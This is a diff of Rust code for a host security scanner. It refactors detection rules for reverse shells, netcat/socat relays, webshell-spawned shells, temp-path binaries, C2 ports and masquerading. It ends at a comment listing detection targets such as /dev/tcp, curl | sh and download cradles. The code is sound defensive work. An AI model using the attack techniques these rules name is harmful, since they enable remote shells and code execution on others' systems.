@@ -110,278 +110,389 @@ pub fn evaluate_security_heuristics(
     collector.items
 }
 
+/// Fixed metadata of one rule. The text that depends on the socket or process is added per hit.
+struct Rule {
+    id: &'static str,
+    category: &'static str,
+    mitre: &'static str,
+    remediation: &'static str,
+}
+
+impl Rule {
+    fn finding(
+        &self,
+        severity: Severity,
+        title: String,
+        description: String,
+        evidence: String,
+    ) -> SecurityFinding {
+        SecurityFinding {
+            rule_id: self.id.to_string(),
+            category: self.category.to_string(),
+            mitre_id: self.mitre.to_string(),
+            severity,
+            title,
+            description,
+            pid: None,
+            process_name: None,
+            endpoint: None,
+            evidence,
+            remediation: self.remediation.to_string(),
+        }
+    }
+}
+
+impl SecurityFinding {
+    fn at_socket(mut self, conn: &ConnectionEntry, endpoint: String) -> Self {
+        self.pid = conn.pid;
+        self.process_name = Some(conn.process_name.clone());
+        self.endpoint = Some(endpoint);
+        self
+    }
+
+    fn at_process(mut self, p: &ProcessRecord) -> Self {
+        self.pid = Some(p.pid);
+        self.process_name = Some(p.name.clone());
+        self
+    }
+}
+
+const REV_SHELL: Rule = Rule {
+    id: "H01-REV-SHELL",
+    category: "Reverse / Bind Shell",
+    mitre: "T1059",
+    remediation: "Terminate the process tree and inspect the parent process.",
+};
+const RAW_RELAY: Rule = Rule {
+    id: "H01-RAW-RELAY",
+    category: "Socket Relay Utility",
+    mitre: "T1095",
+    remediation: "Terminate if unauthorized and check user persistence.",
+};
+const INLINE_SHELL: Rule = Rule {
+    id: "H01-INLINE-SHELL",
+    category: "Reverse Shell",
+    mitre: "T1059.006",
+    remediation: "Terminate the interpreter process and inspect its parent.",
+};
+const TEMP_NET_EXEC: Rule = Rule {
+    id: "H02-TEMP-NET-EXEC",
+    category: "Suspicious Execution Path",
+    mitre: "T1204",
+    remediation: "Quarantine the binary and terminate the process.",
+};
+const TEMP_EXEC: Rule = Rule {
+    id: "H02-TEMP-EXEC",
+    category: "Suspicious Execution Path",
+    mitre: "T1204",
+    remediation: "Verify if an installer is active; otherwise quarantine the binary.",
+};
+const FILELESS_BINARY: Rule = Rule {
+    id: "H03-FILELESS-BINARY",
+    category: "Unlinked / Deleted Binary",
+    mitre: "T1620",
+    remediation: "Inspect /proc/<pid>/exe before terminating the process.",
+};
+const MASQUERADING: Rule = Rule {
+    id: "H04-MASQUERADING",
+    category: "Process Masquerading",
+    mitre: "T1036.005",
+    remediation: "Verify the binary hash against clean OS files and terminate if unauthorized.",
+};
+const BACKDOOR_PORT: Rule = Rule {
+    id: "H05-BACKDOOR-PORT",
+    category: "Suspicious Port",
+    mitre: "T1571",
+    remediation: "Verify whether this listener is intentional; otherwise terminate and block the port.",
+};
+const OUTBOUND_C2_PORT: Rule = Rule {
+    id: "H05-OUTBOUND-C2-PORT",
+    category: "Suspicious Outbound Port",
+    mitre: "T1571",
+    remediation: "Block the remote IP at the firewall and inspect the binary.",
+};
+/// Remediation depends on the service, so it comes from `ports_db`.
+const EXPOSED_SERVICE: Rule = Rule {
+    id: "H06-EXPOSED-SERVICE",
+    category: "Exposed Network Service",
+    mitre: "T1190",
+    remediation: "",
+};
+const SERVER_SHELL: Rule = Rule {
+    id: "H06-SERVER-SHELL",
+    category: "Webshell / Server RCE",
+    mitre: "T1505.003",
+    remediation: "Isolate the service, inspect server logs, and kill the process tree.",
+};
+const OBFUSCATED_CMD: Rule = Rule {
+    id: "H07-OBFUSCATED-CMD",
+    category: "Suspicious Command Line",
+    mitre: "T1027",
+    remediation: "Decode the payload, inspect parent process lineage, and terminate if unauthorized.",
+};
+
+/// Lowercased text of one socket's owner, computed once for all socket rules.
+struct SocketView {
+    proc_lower: String,
+    exe_lower: String,
+    cmd_lower: String,
+    is_listening: bool,
+    /// On a port this host listens on. Its remote port is the peer's random source port,
+    /// so the outbound C2 port rule must not read it.
+    is_inbound: bool,
+}
+
+type SocketRule = fn(&mut ConnectionEntry, &SocketView, &mut FindingCollector);
+
+/// The order only decides the order of `risk_reasons`.
+const SOCKET_RULES: [SocketRule; 8] = [
+    shell_owns_socket,
+    relay_tool_socket,
+    inline_script_shell,
+    temp_path_socket,
+    c2_port_local,
+    c2_port_remote,
+    all_interfaces_listener,
+    unresolved_external_peer,
+];
+
 fn evaluate_connection(
     conn: &mut ConnectionEntry,
     listen_ports: &HashSet<u16>,
     collector: &mut FindingCollector,
 ) {
-    let proc_lower = conn.process_name.to_lowercase();
-    let exe_lower = conn.exe_path.to_lowercase().replace('/', "\\");
-    let cmd_lower = conn.cmdline.to_lowercase();
     let is_listening = conn.is_listening();
-    // A connection on a port this host listens on is inbound. Its remote port is the
-    // peer's random source port, so the C2 port rule below must not read it.
-    let is_inbound = !is_listening && listen_ports.contains(&conn.local_port);
+    let view = SocketView {
+        proc_lower: conn.process_name.to_lowercase(),
+        exe_lower: conn.exe_path.to_lowercase().replace('/', "\\"),
+        cmd_lower: conn.cmdline.to_lowercase(),
+        is_listening,
+        is_inbound: !is_listening && listen_ports.contains(&conn.local_port),
+    };
+    for rule in SOCKET_RULES {
+        rule(conn, &view, collector);
+    }
+}
 
-    if SHELL_NAMES.contains(&proc_lower.as_str()) {
-        conn.elevate_severity(
+/// H01: an interactive shell holds a socket.
+fn shell_owns_socket(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
+    if !SHELL_NAMES.contains(&v.proc_lower.as_str()) {
+        return;
+    }
+    conn.elevate_severity(
+        Severity::Critical,
+        format!("Command shell '{}' owns a network socket ({})", conn.process_name, conn.state),
+    );
+    let finding = REV_SHELL
+        .finding(
             Severity::Critical,
+            format!("Active Socket Bound to Shell ({})", conn.process_name),
             format!(
-                "Command shell '{}' owns a network socket ({})",
-                conn.process_name, conn.state
+                "Shell '{}' (PID {}) holds a {} socket on {} -> {}.",
+                conn.process_name,
+                conn.pid.unwrap_or(0),
+                conn.protocol.as_str(),
+                conn.local_endpoint(),
+                conn.remote_display()
             ),
-        );
-        collector.insert(
-            format!("H01-SHELL-{}-{:?}", conn.process_name, conn.pid),
-            SecurityFinding {
-                rule_id: "H01-REV-SHELL".to_string(),
-                category: "Reverse / Bind Shell".to_string(),
-                mitre_id: "T1059".to_string(),
-                severity: Severity::Critical,
-                title: format!("Active Socket Bound to Shell ({})", conn.process_name),
-                description: format!(
-                    "Shell '{}' (PID {}) holds a {} socket on {} -> {}.",
-                    conn.process_name,
-                    conn.pid.unwrap_or(0),
-                    conn.protocol.as_str(),
-                    conn.local_endpoint(),
-                    conn.remote_display()
-                ),
-                pid: conn.pid,
-                process_name: Some(conn.process_name.clone()),
-                endpoint: Some(format!(
-                    "{} -> {}",
-                    conn.local_endpoint(),
-                    conn.remote_endpoint()
-                )),
-                evidence: format!(
-                    "Lineage: {} | Cmd: {}",
-                    conn.lineage.join(" -> "),
-                    conn.cmdline
-                ),
-                remediation: "Terminate the process tree and inspect the parent process.".to_string(),
-            },
-        );
-    }
+            format!("Lineage: {} | Cmd: {}", conn.lineage.join(" -> "), conn.cmdline),
+        )
+        .at_socket(conn, format!("{} -> {}", conn.local_endpoint(), conn.remote_endpoint()));
+    out.insert(format!("H01-SHELL-{}-{:?}", conn.process_name, conn.pid), finding);
+}
 
-    if NETCAT_TOOLS.contains(&proc_lower.as_str()) {
-        conn.elevate_severity(
+/// H01: netcat, socat and similar relays hold a socket.
+fn relay_tool_socket(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
+    if !NETCAT_TOOLS.contains(&v.proc_lower.as_str()) {
+        return;
+    }
+    conn.elevate_severity(
+        Severity::Critical,
+        format!("Socket relay tool '{}' active on network", conn.process_name),
+    );
+    let finding = RAW_RELAY
+        .finding(
             Severity::Critical,
-            format!("Socket relay tool '{}' active on network", conn.process_name),
-        );
-        collector.insert(
-            format!("H01-NETCAT-{}-{:?}", conn.process_name, conn.pid),
-            SecurityFinding {
-                rule_id: "H01-RAW-RELAY".to_string(),
-                category: "Socket Relay Utility".to_string(),
-                mitre_id: "T1095".to_string(),
-                severity: Severity::Critical,
-                title: format!("Netcat / Socat Relay Active ({})", conn.process_name),
-                description: format!(
-                    "Relay utility '{}' (PID {}) is {} on {}.",
-                    conn.process_name,
-                    conn.pid.unwrap_or(0),
-                    conn.state,
-                    conn.local_endpoint()
-                ),
-                pid: conn.pid,
-                process_name: Some(conn.process_name.clone()),
-                endpoint: Some(conn.local_endpoint()),
-                evidence: format!("Cmd: {} | Exe: {}", conn.cmdline, conn.exe_path),
-                remediation: "Terminate if unauthorized and check user persistence.".to_string(),
-            },
-        );
-    }
+            format!("Netcat / Socat Relay Active ({})", conn.process_name),
+            format!(
+                "Relay utility '{}' (PID {}) is {} on {}.",
+                conn.process_name,
+                conn.pid.unwrap_or(0),
+                conn.state,
+                conn.local_endpoint()
+            ),
+            format!("Cmd: {} | Exe: {}", conn.cmdline, conn.exe_path),
+        )
+        .at_socket(conn, conn.local_endpoint());
+    out.insert(format!("H01-NETCAT-{}-{:?}", conn.process_name, conn.pid), finding);
+}
 
-    if is_scripting_reverse_shell(&proc_lower, &cmd_lower) {
-        conn.elevate_severity(
+/// H01: an interpreter runs an inline socket or PTY payload.
+fn inline_script_shell(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
+    if !is_scripting_reverse_shell(&v.proc_lower, &v.cmd_lower) {
+        return;
+    }
+    conn.elevate_severity(
+        Severity::Critical,
+        "Scripting interpreter running inline socket/PTY payload".to_string(),
+    );
+    let finding = INLINE_SHELL
+        .finding(
             Severity::Critical,
-            "Scripting interpreter running inline socket/PTY payload".to_string(),
-        );
-        collector.insert(
-            format!("H01-SCRIPT-SHELL-{:?}", conn.pid),
-            SecurityFinding {
-                rule_id: "H01-INLINE-SHELL".to_string(),
-                category: "Reverse Shell".to_string(),
-                mitre_id: "T1059.006".to_string(),
-                severity: Severity::Critical,
-                title: format!("Inline Scripting Reverse Shell ({})", conn.process_name),
-                description: format!(
-                    "Interpreter '{}' (PID {}) is running inline socket/shell primitives connected to {}.",
-                    conn.process_name,
-                    conn.pid.unwrap_or(0),
-                    conn.remote_display()
-                ),
-                pid: conn.pid,
-                process_name: Some(conn.process_name.clone()),
-                endpoint: Some(format!(
-                    "{} -> {}",
-                    conn.local_endpoint(),
-                    conn.remote_endpoint()
-                )),
-                evidence: format!("Cmdline: {}", conn.cmdline),
-                remediation: "Terminate the interpreter process and inspect its parent.".to_string(),
-            },
-        );
-    }
+            format!("Inline Scripting Reverse Shell ({})", conn.process_name),
+            format!(
+                "Interpreter '{}' (PID {}) is running inline socket/shell primitives connected to {}.",
+                conn.process_name,
+                conn.pid.unwrap_or(0),
+                conn.remote_display()
+            ),
+            format!("Cmdline: {}", conn.cmdline),
+        )
+        .at_socket(conn, format!("{} -> {}", conn.local_endpoint(), conn.remote_endpoint()));
+    out.insert(format!("H01-SCRIPT-SHELL-{:?}", conn.pid), finding);
+}
 
-    if let Some(reason) = check_suspicious_exec_path(&conn.exe_path, &exe_lower) {
-        conn.elevate_severity(Severity::Critical, reason.clone());
-        collector.insert(
-            format!("H02-NET-PATH-{:?}-{}", conn.pid, conn.exe_path),
-            SecurityFinding {
-                rule_id: "H02-TEMP-NET-EXEC".to_string(),
-                category: "Suspicious Execution Path".to_string(),
-                mitre_id: "T1204".to_string(),
-                severity: Severity::Critical,
-                title: format!(
-                    "Network-Active Binary in Temp/Writable Path ({})",
-                    conn.process_name
-                ),
-                description: format!(
-                    "Process '{}' (PID {}) has active socket {} while running from {}.",
-                    conn.process_name,
-                    conn.pid.unwrap_or(0),
-                    conn.local_endpoint(),
-                    reason
-                ),
-                pid: conn.pid,
-                process_name: Some(conn.process_name.clone()),
-                endpoint: Some(conn.local_endpoint()),
-                evidence: format!("Exe: {}", conn.exe_path),
-                remediation: "Quarantine the binary and terminate the process.".to_string(),
-            },
-        );
-    }
+/// H02: the socket owner runs from a temp or world-writable folder.
+fn temp_path_socket(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
+    let Some(reason) = check_suspicious_exec_path(&conn.exe_path, &v.exe_lower) else {
+        return;
+    };
+    conn.elevate_severity(Severity::Critical, reason.clone());
+    let finding = TEMP_NET_EXEC
+        .finding(
+            Severity::Critical,
+            format!("Network-Active Binary in Temp/Writable Path ({})", conn.process_name),
+            format!(
+                "Process '{}' (PID {}) has active socket {} while running from {}.",
+                conn.process_name,
+                conn.pid.unwrap_or(0),
+                conn.local_endpoint(),
+                reason
+            ),
+            format!("Exe: {}", conn.exe_path),
+        )
+        .at_socket(conn, conn.local_endpoint());
+    out.insert(format!("H02-NET-PATH-{:?}-{}", conn.pid, conn.exe_path), finding);
+}
 
-    if is_listening || conn.local_port < 32768 {
-        if let Some(intel) = check_backdoor_port(conn.local_port) {
-            conn.elevate_severity(
-                intel.severity,
-                format!("{}: {}", intel.threat_name, intel.reason),
-            );
-            collector.insert(
-                format!("H05-LOCAL-PORT-{}-{:?}", conn.local_port, conn.pid),
-                SecurityFinding {
-                    rule_id: "H05-BACKDOOR-PORT".to_string(),
-                    category: "Suspicious Port".to_string(),
-                    mitre_id: "T1571".to_string(),
-                    severity: intel.severity,
-                    title: format!(
-                        "Port {} Associated with {} ({})",
-                        conn.local_port, intel.threat_name, conn.process_name
-                    ),
-                    description: format!(
-                        "{} Process '{}' (PID {}) is using local port {} ({}).",
-                        intel.reason,
-                        conn.process_name,
-                        conn.pid.unwrap_or(0),
-                        conn.local_port,
-                        conn.state
-                    ),
-                    pid: conn.pid,
-                    process_name: Some(conn.process_name.clone()),
-                    endpoint: Some(conn.local_endpoint()),
-                    evidence: format!(
-                        "Endpoint: {} | Process: {} | Exe: {}",
-                        conn.local_endpoint(),
-                        conn.process_name,
-                        conn.exe_path
-                    ),
-                    remediation: "Verify whether this listener is intentional; otherwise terminate and block the port.".to_string(),
-                },
-            );
-        }
+/// H05: a listener, or a socket on a fixed low port, uses a known C2 or RAT port.
+fn c2_port_local(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
+    // Ports from 32768 up on a non-listening socket are OS-chosen source ports.
+    if !(v.is_listening || conn.local_port < 32768) {
+        return;
     }
+    let Some(intel) = check_backdoor_port(conn.local_port) else {
+        return;
+    };
+    conn.elevate_severity(intel.severity, format!("{}: {}", intel.threat_name, intel.reason));
+    let finding = BACKDOOR_PORT
+        .finding(
+            intel.severity,
+            format!(
+                "Port {} Associated with {} ({})",
+                conn.local_port, intel.threat_name, conn.process_name
+            ),
+            format!(
+                "{} Process '{}' (PID {}) is using local port {} ({}).",
+                intel.reason,
+                conn.process_name,
+                conn.pid.unwrap_or(0),
+                conn.local_port,
+                conn.state
+            ),
+            format!(
+                "Endpoint: {} | Process: {} | Exe: {}",
+                conn.local_endpoint(),
+                conn.process_name,
+                conn.exe_path
+            ),
+        )
+        .at_socket(conn, conn.local_endpoint());
+    out.insert(format!("H05-LOCAL-PORT-{}-{:?}", conn.local_port, conn.pid), finding);
+}
 
-    if let Some(rem_port) = conn.remote_port.filter(|_| !is_inbound) {
-        if let Some(intel) = check_backdoor_port(rem_port) {
-            conn.elevate_severity(
-                intel.severity,
-                format!("Outbound connection to {}: {}", intel.threat_name, intel.reason),
-            );
-            collector.insert(
-                format!("H05-REM-PORT-{}-{:?}", rem_port, conn.pid),
-                SecurityFinding {
-                    rule_id: "H05-OUTBOUND-C2-PORT".to_string(),
-                    category: "Suspicious Outbound Port".to_string(),
-                    mitre_id: "T1571".to_string(),
-                    severity: intel.severity,
-                    title: format!(
-                        "Outbound Connection to Port {} ({})",
-                        rem_port, intel.threat_name
-                    ),
-                    description: format!(
-                        "Process '{}' (PID {}) is connected to {} on port {}. {}",
-                        conn.process_name,
-                        conn.pid.unwrap_or(0),
-                        conn.remote_display(),
-                        rem_port,
-                        intel.reason
-                    ),
-                    pid: conn.pid,
-                    process_name: Some(conn.process_name.clone()),
-                    endpoint: Some(conn.remote_endpoint()),
-                    evidence: format!(
-                        "{} -> {} | Exe: {}",
-                        conn.local_endpoint(),
-                        conn.remote_display(),
-                        conn.exe_path
-                    ),
-                    remediation: "Block the remote IP at the firewall and inspect the binary.".to_string(),
-                },
-            );
-        }
+/// H05: an outbound connection goes to a known C2, RAT or mining port.
+fn c2_port_remote(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
+    let Some(rem_port) = conn.remote_port.filter(|_| !v.is_inbound) else {
+        return;
+    };
+    let Some(intel) = check_backdoor_port(rem_port) else {
+        return;
+    };
+    conn.elevate_severity(
+        intel.severity,
+        format!("Outbound connection to {}: {}", intel.threat_name, intel.reason),
+    );
+    let finding = OUTBOUND_C2_PORT
+        .finding(
+            intel.severity,
+            format!("Outbound Connection to Port {} ({})", rem_port, intel.threat_name),
+            format!(
+                "Process '{}' (PID {}) is connected to {} on port {}. {}",
+                conn.process_name,
+                conn.pid.unwrap_or(0),
+                conn.remote_display(),
+                rem_port,
+                intel.reason
+            ),
+            format!(
+                "{} -> {} | Exe: {}",
+                conn.local_endpoint(),
+                conn.remote_display(),
+                conn.exe_path
+            ),
+        )
+        .at_socket(conn, conn.remote_endpoint());
+    out.insert(format!("H05-REM-PORT-{}-{:?}", rem_port, conn.pid), finding);
+}
+
+/// H06: a sensitive service listens on 0.0.0.0 or ::. Any other TCP listener there is Low.
+fn all_interfaces_listener(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
+    if !(v.is_listening && conn.exposure == ExposureScope::WildcardAllInterfaces) {
+        return;
     }
-
-    if is_listening && conn.exposure == ExposureScope::WildcardAllInterfaces {
-        if let Some(rule) = check_sensitive_wildcard_port(conn.local_port) {
-            conn.elevate_severity(
-                rule.severity,
-                format!(
-                    "{} (port {}) bound to all interfaces (0.0.0.0/::)",
-                    rule.service, rule.port
-                ),
-            );
-            collector.insert(
-                format!("H06-WILDCARD-{}-{}", conn.local_port, conn.process_name),
-                SecurityFinding {
-                    rule_id: "H06-EXPOSED-SERVICE".to_string(),
-                    category: "Exposed Network Service".to_string(),
-                    mitre_id: "T1190".to_string(),
-                    severity: rule.severity,
-                    title: format!(
-                        "{} (Port {}) Exposed on All Interfaces",
-                        rule.service, rule.port
-                    ),
-                    description: format!(
-                        "{} Process '{}' (PID {}) is listening on {}.",
-                        rule.risk_summary,
-                        conn.process_name,
-                        conn.pid.unwrap_or(0),
-                        conn.local_endpoint()
-                    ),
-                    pid: conn.pid,
-                    process_name: Some(conn.process_name.clone()),
-                    endpoint: Some(conn.local_endpoint()),
-                    evidence: format!(
-                        "Listener: {} ({}) | Process: {} | Exe: {}",
-                        conn.local_endpoint(),
-                        conn.protocol.as_str(),
-                        conn.process_name,
-                        conn.exe_path
-                    ),
-                    remediation: rule.remediation.to_string(),
-                },
-            );
-        } else if conn.protocol.is_tcp() && conn.service_name != "Win-RPC-Dyn" {
+    let Some(rule) = check_sensitive_wildcard_port(conn.local_port) else {
+        if conn.protocol.is_tcp() && conn.service_name != "Win-RPC-Dyn" {
             conn.elevate_severity(
                 Severity::Low,
                 "TCP listener bound to all interfaces (0.0.0.0 / ::)".to_string(),
             );
         }
-    }
+        return;
+    };
+    conn.elevate_severity(
+        rule.severity,
+        format!(
+            "{} (port {}) bound to all interfaces (0.0.0.0/::)",
+            rule.service, rule.port
+        ),
+    );
+    let mut finding = EXPOSED_SERVICE
+        .finding(
+            rule.severity,
+            format!("{} (Port {}) Exposed on All Interfaces", rule.service, rule.port),
+            format!(
+                "{} Process '{}' (PID {}) is listening on {}.",
+                rule.risk_summary,
+                conn.process_name,
+                conn.pid.unwrap_or(0),
+                conn.local_endpoint()
+            ),
+            format!(
+                "Listener: {} ({}) | Process: {} | Exe: {}",
+                conn.local_endpoint(),
+                conn.protocol.as_str(),
+                conn.process_name,
+                conn.exe_path
+            ),
+        )
+        .at_socket(conn, conn.local_endpoint());
+    finding.remediation = rule.remediation.to_string();
+    out.insert(format!("H06-WILDCARD-{}-{}", conn.local_port, conn.process_name), finding);
+}
 
+/// Low: a public peer talks to a process whose binary path is unknown.
+fn unresolved_external_peer(conn: &mut ConnectionEntry, _v: &SocketView, _out: &mut FindingCollector) {
     if conn.remote_category == IpCategory::PublicInternet
         && conn.exe_path.is_empty()
         && conn.pid.unwrap_or(0) > 4
@@ -394,168 +505,150 @@ fn evaluate_connection(
     }
 }
 
+/// Lowercased text of one process, computed once for all process rules.
+struct ProcessView {
+    name_lower: String,
+    exe_lower: String,
+    cmd_lower: String,
+}
+
+type ProcessRule = fn(&mut ProcessRecord, &ProcessView, &mut FindingCollector);
+
+const PROCESS_RULES: [ProcessRule; 5] = [
+    deleted_binary,
+    masquerading,
+    temp_path_process,
+    server_spawned_shell,
+    suspicious_cmdline,
+];
+
 fn evaluate_process(proc_rec: &mut ProcessRecord, collector: &mut FindingCollector) {
-    let name_lower = proc_rec.name.to_lowercase();
-    let exe_lower = proc_rec.exe_path.to_lowercase().replace('/', "\\");
-    let cmd_lower = proc_rec.cmdline.to_lowercase();
-
-    if proc_rec.is_deleted_binary {
-        proc_rec.max_severity = Severity::Critical;
-        collector.insert(
-            format!("H03-DELETED-{}", proc_rec.pid),
-            SecurityFinding {
-                rule_id: "H03-FILELESS-BINARY".to_string(),
-                category: "Unlinked / Deleted Binary".to_string(),
-                mitre_id: "T1620".to_string(),
-                severity: Severity::Critical,
-                title: format!(
-                    "Process Running from Deleted or Memory Binary ({})",
-                    proc_rec.name
-                ),
-                description: format!(
-                    "Process '{}' (PID {}) is executing from an unlinked binary or memfd descriptor ('{}').",
-                    proc_rec.name, proc_rec.pid, proc_rec.exe_path
-                ),
-                pid: Some(proc_rec.pid),
-                process_name: Some(proc_rec.name.clone()),
-                endpoint: None,
-                evidence: format!(
-                    "Exe: {} | Cmd: {} | Lineage: {}",
-                    proc_rec.exe_path,
-                    proc_rec.cmdline,
-                    proc_rec.lineage.join(" -> ")
-                ),
-                remediation: "Inspect /proc/<pid>/exe before terminating the process.".to_string(),
-            },
-        );
+    let view = ProcessView {
+        name_lower: proc_rec.name.to_lowercase(),
+        exe_lower: proc_rec.exe_path.to_lowercase().replace('/', "\\"),
+        cmd_lower: proc_rec.cmdline.to_lowercase(),
+    };
+    for rule in PROCESS_RULES {
+        rule(proc_rec, &view, collector);
     }
+}
 
-    if let Some((sev, reason)) =
-        check_process_masquerading(&name_lower, &cmd_lower, &exe_lower, &proc_rec.exe_path)
-    {
-        if sev > proc_rec.max_severity {
-            proc_rec.max_severity = sev;
-        }
-        collector.insert(
-            format!("H04-MASQ-{}", proc_rec.pid),
-            SecurityFinding {
-                rule_id: "H04-MASQUERADING".to_string(),
-                category: "Process Masquerading".to_string(),
-                mitre_id: "T1036.005".to_string(),
-                severity: sev,
-                title: format!(
-                    "System Process Masquerading: {} (PID {})",
-                    proc_rec.name, proc_rec.pid
-                ),
-                description: reason,
-                pid: Some(proc_rec.pid),
-                process_name: Some(proc_rec.name.clone()),
-                endpoint: None,
-                evidence: format!(
-                    "Exe: {} | Lineage: {}",
-                    proc_rec.exe_path,
-                    proc_rec.lineage.join(" -> ")
-                ),
-                remediation: "Verify the binary hash against clean OS files and terminate if unauthorized.".to_string(),
-            },
-        );
+fn raise_severity(p: &mut ProcessRecord, sev: Severity) {
+    if sev > p.max_severity {
+        p.max_severity = sev;
     }
+}
 
-    if let Some(reason) = check_suspicious_exec_path(&proc_rec.exe_path, &exe_lower) {
-        let sev = if proc_rec.open_sockets_count > 0 {
-            Severity::Critical
-        } else {
-            Severity::High
-        };
-        if sev > proc_rec.max_severity {
-            proc_rec.max_severity = sev;
-        }
-        let net_key = format!("H02-NET-PATH-{:?}-{}", Some(proc_rec.pid), proc_rec.exe_path);
-        if !collector.contains(&net_key) {
-            collector.insert(
-                format!("H02-PROC-PATH-{}", proc_rec.pid),
-                SecurityFinding {
-                    rule_id: "H02-TEMP-EXEC".to_string(),
-                    category: "Suspicious Execution Path".to_string(),
-                    mitre_id: "T1204".to_string(),
-                    severity: sev,
-                    title: format!(
-                        "Process Running from Temp/Writable Directory ({})",
-                        proc_rec.name
-                    ),
-                    description: format!(
-                        "Process '{}' (PID {}) is executing from {}.",
-                        proc_rec.name, proc_rec.pid, reason
-                    ),
-                    pid: Some(proc_rec.pid),
-                    process_name: Some(proc_rec.name.clone()),
-                    endpoint: None,
-                    evidence: format!("Exe: {} | Cmd: {}", proc_rec.exe_path, proc_rec.cmdline),
-                    remediation: "Verify if an installer is active; otherwise quarantine the binary.".to_string(),
-                },
-            );
-        }
+/// H03: the process image is unlinked or memfd-backed.
+fn deleted_binary(p: &mut ProcessRecord, _v: &ProcessView, out: &mut FindingCollector) {
+    if !p.is_deleted_binary {
+        return;
     }
+    raise_severity(p, Severity::Critical);
+    let finding = FILELESS_BINARY
+        .finding(
+            Severity::Critical,
+            format!("Process Running from Deleted or Memory Binary ({})", p.name),
+            format!(
+                "Process '{}' (PID {}) is executing from an unlinked binary or memfd descriptor ('{}').",
+                p.name, p.pid, p.exe_path
+            ),
+            format!(
+                "Exe: {} | Cmd: {} | Lineage: {}",
+                p.exe_path,
+                p.cmdline,
+                p.lineage.join(" -> ")
+            ),
+        )
+        .at_process(p);
+    out.insert(format!("H03-DELETED-{}", p.pid), finding);
+}
 
-    if SHELL_NAMES.contains(&name_lower.as_str()) && proc_rec.lineage.len() >= 2 {
-        let parent_entry = proc_rec.lineage[proc_rec.lineage.len() - 2].to_lowercase();
-        if SERVER_PARENTS.iter().any(|&srv| parent_entry.starts_with(srv)) {
-            proc_rec.max_severity = Severity::Critical;
-            collector.insert(
-                format!("H06-WEBSHELL-{}", proc_rec.pid),
-                SecurityFinding {
-                    rule_id: "H06-SERVER-SHELL".to_string(),
-                    category: "Webshell / Server RCE".to_string(),
-                    mitre_id: "T1505.003".to_string(),
-                    severity: Severity::Critical,
-                    title: format!("Server Daemon Spawned Shell ({})", proc_rec.name),
-                    description: format!(
-                        "Shell '{}' (PID {}) was spawned by server process '{}'.",
-                        proc_rec.name,
-                        proc_rec.pid,
-                        proc_rec.lineage.join(" -> ")
-                    ),
-                    pid: Some(proc_rec.pid),
-                    process_name: Some(proc_rec.name.clone()),
-                    endpoint: None,
-                    evidence: format!(
-                        "Lineage: {} | Cmd: {}",
-                        proc_rec.lineage.join(" -> "),
-                        proc_rec.cmdline
-                    ),
-                    remediation: "Isolate the service, inspect server logs, and kill the process tree.".to_string(),
-                },
-            );
-        }
-    }
+/// H04: typosquats, kernel-thread look-alikes, and system binaries outside System32.
+fn masquerading(p: &mut ProcessRecord, v: &ProcessView, out: &mut FindingCollector) {
+    let Some((sev, reason)) =
+        check_process_masquerading(&v.name_lower, &v.cmd_lower, &v.exe_lower, &p.exe_path)
+    else {
+        return;
+    };
+    raise_severity(p, sev);
+    let finding = MASQUERADING
+        .finding(
+            sev,
+            format!("System Process Masquerading: {} (PID {})", p.name, p.pid),
+            reason,
+            format!("Exe: {} | Lineage: {}", p.exe_path, p.lineage.join(" -> ")),
+        )
+        .at_process(p);
+    out.insert(format!("H04-MASQ-{}", p.pid), finding);
+}
 
-    if let Some((sev, indicator)) = check_suspicious_cmdline(&name_lower, &cmd_lower) {
-        if sev > proc_rec.max_severity {
-            proc_rec.max_severity = sev;
-        }
-        collector.insert(
-            format!("H07-CMDLINE-{}", proc_rec.pid),
-            SecurityFinding {
-                rule_id: "H07-OBFUSCATED-CMD".to_string(),
-                category: "Suspicious Command Line".to_string(),
-                mitre_id: "T1027".to_string(),
-                severity: sev,
-                title: format!(
-                    "Suspicious Command-Line Payload in {} (PID {})",
-                    proc_rec.name, proc_rec.pid
-                ),
-                description: format!(
-                    "Process '{}' launched with arguments matching: {}.",
-                    proc_rec.name, indicator
-                ),
-                pid: Some(proc_rec.pid),
-                process_name: Some(proc_rec.name.clone()),
-                endpoint: None,
-                evidence: format!("Cmdline: {}", proc_rec.cmdline),
-                remediation: "Decode the payload, inspect parent process lineage, and terminate if unauthorized.".to_string(),
-            },
-        );
+/// H02: the process runs from a temp folder. Skipped when the socket rule already reported it.
+fn temp_path_process(p: &mut ProcessRecord, v: &ProcessView, out: &mut FindingCollector) {
+    let Some(reason) = check_suspicious_exec_path(&p.exe_path, &v.exe_lower) else {
+        return;
+    };
+    let sev = if p.open_sockets_count > 0 {
+        Severity::Critical
+    } else {
+        Severity::High
+    };
+    raise_severity(p, sev);
+    if out.contains(&format!("H02-NET-PATH-{:?}-{}", Some(p.pid), p.exe_path)) {
+        return;
     }
+    let finding = TEMP_EXEC
+        .finding(
+            sev,
+            format!("Process Running from Temp/Writable Directory ({})", p.name),
+            format!("Process '{}' (PID {}) is executing from {}.", p.name, p.pid, reason),
+            format!("Exe: {} | Cmd: {}", p.exe_path, p.cmdline),
+        )
+        .at_process(p);
+    out.insert(format!("H02-PROC-PATH-{}", p.pid), finding);
+}
+
+/// H06: a web or database server is the direct parent of a shell.
+fn server_spawned_shell(p: &mut ProcessRecord, v: &ProcessView, out: &mut FindingCollector) {
+    if !SHELL_NAMES.contains(&v.name_lower.as_str()) || p.lineage.len() < 2 {
+        return;
+    }
+    let parent_entry = p.lineage[p.lineage.len() - 2].to_lowercase();
+    if !SERVER_PARENTS.iter().any(|&srv| parent_entry.starts_with(srv)) {
+        return;
+    }
+    raise_severity(p, Severity::Critical);
+    let finding = SERVER_SHELL
+        .finding(
+            Severity::Critical,
+            format!("Server Daemon Spawned Shell ({})", p.name),
+            format!(
+                "Shell '{}' (PID {}) was spawned by server process '{}'.",
+                p.name,
+                p.pid,
+                p.lineage.join(" -> ")
+            ),
+            format!("Lineage: {} | Cmd: {}", p.lineage.join(" -> "), p.cmdline),
+        )
+        .at_process(p);
+    out.insert(format!("H06-WEBSHELL-{}", p.pid), finding);
+}
+
+/// H07: encoded PowerShell, download cradles, /dev/tcp, curl | sh, LOLBins.
